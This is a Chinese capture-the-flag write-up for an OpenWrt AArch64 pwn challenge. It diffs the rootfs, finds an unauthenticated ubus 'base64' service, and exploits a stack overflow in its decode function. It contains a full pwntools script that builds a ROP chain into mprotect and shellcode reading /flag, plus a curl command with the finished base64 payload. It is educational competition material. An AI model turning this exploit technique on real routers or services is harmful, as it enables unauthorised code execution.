# d3op

## 题目简述

题目是 OpenWrt rootfs 审计与 AArch64 用户态 pwn。解包 rootfs 后确认系统为 OpenWrt 22.03.3，并通过与官方 rootfs diff 发现 unauthenticated ubus RPC 暴露了自定义 `base64` 服务。逆向 `base64` 可见 encode/decode 输出长度计算和索引检查不一致，能通过 JSON RPC 传入超长 base64 数据触发栈溢出，构造 AArch64 ROP/mprotect + shellcode 读取 `/flag`。

## 解题过程

首先用下面的命令解包 rootfs：

```
unsquashfs squashfs-root.img
```

然后在 rootfs 的 `etc/os` - `release` 中，可以找到系统信息：

`os-release` 中的 OpenWrt URL 是发行版元数据，不是漏洞参考链接。这里有用的信息是准确版本（`22.03.3`）、架构（`aarch64_cortex-a53`）和板卡（`armvirt/64`），这些信息可以帮助下载或比较匹配的官方 rootfs 和库文件。

```
NAME="OpenWrt"
VERSION="22.03.3"
ID="openwrt"
ID_LIKE="lede openwrt"
PRETTY_NAME="OpenWrt 22.03.3"
VERSION_ID="22.03.3"
HOME_URL="https://openwrt.org/"
BUG_URL="https://bugs.openwrt.org/"
SUPPORT_URL="https://forum.openwrt.org/"
BUILD_ID="r20028-43d71ad93e"
OPENWRT_BOARD="armvirt/64"
OPENWRT_ARCH="aarch64_cortex-a53"
OPENWRT_TAINTS=""
OPENWRT_DEVICE_MANUFACTURER="OpenWrt"
OPENWRT_DEVICE_MANUFACTURER_URL="https://openwrt.org/"
OPENWRT_DEVICE_PRODUCT="Generic"
OPENWRT_DEVICE_REVISION="v0"
OPENWRT_RELEASE="OpenWrt 22.03.3 r20028-43d71ad93e"
```

接着可以尝试与官方 rootfs 做 diff，从而发现漏洞：一个

未鉴权的 ubus RPC 接口，以及一个名为 `base64` 的二进制文件。

初始配置中 `authenticated` 和 `unauthenticated` 两类路由权限通过 JSON 描述，后续漏洞利用围绕未认证请求的 session/action 字段处理展开。

逆向 `base64` 后可以发现，`decode` 和 `encode` 函数中都存在溢出。这里以 `decode` 函数为例：

输出长度根据输入字符串计算。

编码逻辑会根据输入长度计算输出长度，并按 `=` 填充判断末尾字节。

在函数末尾，程序没有检查 `v6` 的长度，只是简单使用 `output_len` 作为索引上限。

另一处编码循环按 3 字节分组写入输出缓冲区，边界判断只比较当前输出位置和 `output_len`，这是构造越界写/读时要关注的关键。

因此可以输入一个很长的字符串，在 `decode` 函数中触发溢出。

还需要注意一点：OpenWrt ubus 的输入和输出都应该是 JSON 字符串。

下面是构造 base64 payload 的 exp：

```
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwn import *
import base64
context.log_level = "debug"
context.terminal = ["kitty"]
context.arch = "aarch64"
# p = process(["./base64", "decode"])
# elf = ELF("./elf")
# libc = ELF("./libc.so.6")
# 0x00000000004494b8 : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
set_x0 = 0x00000000004494b8
# 0x00000000004010ec : ldr x1, [sp, #0x28] ; add x0, x1, x0 ; ldp x29, x30, [sp],
#0x30 ; ret
set_x1 = 0x00000000004010ec
# call mprotect(x0[0x92] + x0[0x94], x0[0x93] - x0[0x94], 7)
call_mprotect = 0x00000000004579A4
shellcode  = shellcraft.aarch64.linux.open("/flag", 0)
shellcode += shellcraft.aarch64.linux.read(3, 0x4a23a4, 0x100)
shellcode += '''
    MOV X3, X0
    LDR X1, =0x22
    LDR X2, =0x4a23a3
    STRB W1, [X3, X2]
    LDR X1, =0x7d
    LDR X2, =0x4a23a4
    STRB W1, [X3, X2]
'''
shellcode += shellcraft.aarch64.linux.write(1, 0x4a2398, 0x100)
shellcode += '''
    LDR X0, =1
    LDR X9, =0x422D60
    BLR X9
'''
payload = asm(shellcode)
payload = payload.ljust(0x200, b"\x00")
payload += p64(0)
payload += p64(0x4A3000)
payload += p64(0x4A2000)
payload = payload.ljust(0x300, b"\x00")
payload += b"{\"output\": \""
payload = payload.ljust(0x400, b"\x00")
payload += b"A\x00\x00\x00"          # char1
payload += b"A\x00\x00\x00"          # char2
payload += b"A\x00\x00\x00"          # char3
payload += b"A\x00\x00\x00"          # char3
payload += b"A\x00\x00\x00"          # char4
payload += b"A\x00\x00\x00"          # char4
payload += b"\x18\x06\x00\x00"       # input lenght
payload += b"\x1d\x04\x00\x00"       # output idx
payload += b"\x84\x05\x00\x00"       # input idx
payload += b"\x92\x04\x00\x00"       # output length
payload += p64(0x4A2500)             # x29
payload += p64(set_x0)               # x30
payload += p64(0) * 4
payload += p64(0x4A2500)             # x29
payload += p64(call_mprotect)        # x30
payload += p64(0x4A2298 - 0x490)     # x0
payload += b"BBBBBBBB"
payload += b"CCCCCCCC"
payload += p64(0x4A2098)
payload += b"EEEEEEEE"
# p.sendline()
# p.interactive()
payload = base64.b64encode(payload)
print(payload)
```

获取 flag 的命令如下：

```
curl --location 'http://127.0.0.1:9999/ubus' \
                                                               05/02/23 - 11:15
PM
      --header 'Content-Type: application/json' \
      --data '{
      "jsonrpc": "2.0",
      "id": 1,
      "method": "call",
      "params": [
          "00000000000000000000000000000000",
          "base64",
          "decode",
          {
              "input":
"7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaD
yAiCA0ugHgNIBAADU4wMAquEBAFgCAgBYYWgiOAECAFgiAgBYYWgiOCAAgNIBc4TSQQmg8gIggNIICID
SAQAA1GABAFiJAQBYIAE/1iIAAAAAAAAAoyNKAAAAAAB9AAAAAAAAAKQjSgAAAAAAAQAAAAAAAABgLUI
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwSgAAAAAAACBKAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeyJvdXRwdXQiOiA
iAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAEEAAABBAAAAQQAAAEEAAABBAAAAQQAAABgGAAAdBAAAhAUAAJIEAAAAJUoAAAAAALiURAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJUoAAAAAAKR5RQAAAAAACB5KAAAAAABCQkJ
CQkJCQkNDQ0NDQ0NDmCBKAAAAAABFRUVFRUVFRQ=="
          }
      ]
  }'
```

## 方法总结

- 核心技巧：rootfs 解包、与官方 OpenWrt 镜像 diff、未鉴权 ubus RPC、AArch64 栈溢出、mprotect + shellcode 读 flag。
- 识别信号：嵌入式题里出现完整 rootfs 时，先确认发行版版本并与官方镜像 diff；新增二进制被 ubus 暴露且无需鉴权时，优先逆向其参数解析。
- 复用要点：ubus 输入输出必须是 JSON，payload 需要嵌进合法 JSON 字符串；OpenWrt 元数据外链只用于定位基线系统，不是漏洞成因。
